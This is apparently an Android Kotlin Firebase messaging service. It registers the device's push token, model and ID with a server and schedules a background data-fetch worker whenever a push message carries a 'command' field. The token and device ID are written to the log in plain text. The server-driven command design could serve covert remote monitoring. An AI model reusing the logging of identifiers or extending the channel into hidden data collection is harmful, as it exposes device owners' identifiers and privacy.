package com.example.lta

import android.util.Log
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyFirebaseMessagingService : FirebaseMessagingService() {

    private val TAG = "MyFirebaseMsgService"

    /**
     * Called when a new token for the default Firebase project is generated.
     * This is the ideal place to send the FCM token to your app server because it
     * fires both on first install and whenever the token is refreshed.
     */
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token received: $token. Registering with server.")
        // Immediately send the new token to your server.
        sendRegistrationToServer(token)
    }

    /**
     * A helper function to encapsulate the registration logic. It gathers all necessary
     * device information and sends it to the server.
     */
    private fun sendRegistrationToServer(token: String) {
        // We need context to get the server URL and initialize managers
        val context = applicationContext

        // Create instances of our helpers
        val apiClient = ApiClient(context.getString(R.string.server_base_url))
        val systemInfoManager = SystemInfoManager(context)

        // Get the required info
        val deviceModel = systemInfoManager.getDeviceModel()
        val deviceId = systemInfoManager.getDeviceId()

        // Launch a coroutine to perform the network call off the main thread
        CoroutineScope(Dispatchers.IO).launch {
            Log.i(TAG, "Registering device -> ID: $deviceId, Model: $deviceModel, Token: $token")
            apiClient.registerDevice(token, deviceModel, deviceId)
        }
    }

    /**
     * Called when a data message is received from FCM.
     * This logic remains unchanged.
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.d(TAG, "FCM Message From: ${remoteMessage.from}")

        // Check if message contains a data payload with our 'command'.
        remoteMessage.data.isNotEmpty().let {
            Log.d(TAG, "Message data payload: " + remoteMessage.data)

            val command = remoteMessage.data["command"]
            if (command != null) {
                Log.d(TAG, "Received command: '$command'. Scheduling worker.")
                scheduleDataFetchWorker(command)
            } else {
                Log.w(TAG, "Received FCM message without a 'command' key in data.")
            }
        }
    }

    private fun scheduleDataFetchWorker(command: String) {
        val workManager = WorkManager.getInstance(applicationContext)

        // Pass the command to the worker
        val inputData = Data.Builder()
            .putString(DataFetchWorker.KEY_COMMAND, command)
            .build()

        val dataFetchWorkRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
            .setInputData(inputData)
            .build()

        workManager.enqueue(dataFetchWorkRequest)
    }
}
